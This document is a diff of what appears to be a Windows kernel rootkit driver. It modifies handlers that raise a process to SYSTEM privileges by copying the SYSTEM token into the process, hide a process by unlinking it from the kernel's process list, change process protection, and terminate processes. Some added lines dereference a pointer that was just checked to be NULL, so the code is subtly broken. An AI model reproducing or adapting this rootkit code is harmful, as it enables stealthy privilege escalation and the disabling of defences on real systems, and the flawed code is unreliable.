@@ -212,6 +212,7 @@ BeIoctlProtectProcess(ULONG pid, BYTE newProtectionLevel)
     PEPROCESS process = BeGetEprocessByPid(pid);
     if (process == NULL)
     {
+        ObDereferenceObject(process);
         return STATUS_INVALID_PARAMETER_1;
     }
 
@@ -224,6 +225,7 @@ BeIoctlProtectProcess(ULONG pid, BYTE newProtectionLevel)
 
     LOG_MSG("New protection level: %i", *((BYTE*)(EProtectionLevel)));
 
+    ObDereferenceObject(process);
     return STATUS_SUCCESS;
 }
 
@@ -308,6 +310,7 @@ BeIoCtlElevateProcessAcessToken(HANDLE pid)
     if (NtStatus != 0)
     {
         LOG_MSG("PID %i not found", HandleToUlong(pid));
+        ObDereferenceObject(targetProcess);
         return NtStatus;
     }
 
@@ -316,6 +319,8 @@ BeIoCtlElevateProcessAcessToken(HANDLE pid)
     if (NtStatus != 0)
     {
         LOG_MSG("System process not found with pid 4");
+        ObDereferenceObject(privilegedProcess);
+        ObDereferenceObject(targetProcess);
         return NtStatus;
     }
 
@@ -325,6 +330,8 @@ BeIoCtlElevateProcessAcessToken(HANDLE pid)
     // Replace target process token with system token
     *(ULONG64*)((ULONG64)targetProcess + tokenOffset) = *(ULONG64*)((ULONG64)privilegedProcess + tokenOffset);
 
+    ObDereferenceObject(privilegedProcess);
+    ObDereferenceObject(targetProcess);
     return NtStatus;
 }
 
@@ -356,9 +363,9 @@ BeIoctlKillProcess(HANDLE pid)
     obj.SecurityDescriptor = 0;
     obj.SecurityQualityOfService = 0;
 
-    ZwOpenProcess(&hProcess, 1, &obj, &ci);
-    NTSTATUS NtStatus = ZwTerminateProcess(hProcess, 0);
-    ZwClose(hProcess);
+    BeGlobals::pZwOpenProcess(&hProcess, 1, &obj, &ci);
+    NTSTATUS NtStatus = BeGlobals::pZwTerminateProcess(hProcess, 0);
+    BeGlobals::pZwClose(hProcess);
 
     LOG_MSG("KillProcess %i \r\n", NtStatus);
     return NtStatus;
@@ -376,10 +383,13 @@ BeIoctlHideProcess(HANDLE pid)
     PEPROCESS targetProcess = BeGetEprocessByPid(HandleToULong(pid));
     if (targetProcess == NULL)
     {
+        ObDereferenceObject(targetProcess);
         return STATUS_INVALID_PARAMETER;
     }
     PLIST_ENTRY processListEntry = (PLIST_ENTRY)((ULONG_PTR)targetProcess + BeGetProcessLinkedListOffset());
     RemoveEntryList(processListEntry);
+
+    ObDereferenceObject(targetProcess);
     return STATUS_SUCCESS;
 }
 
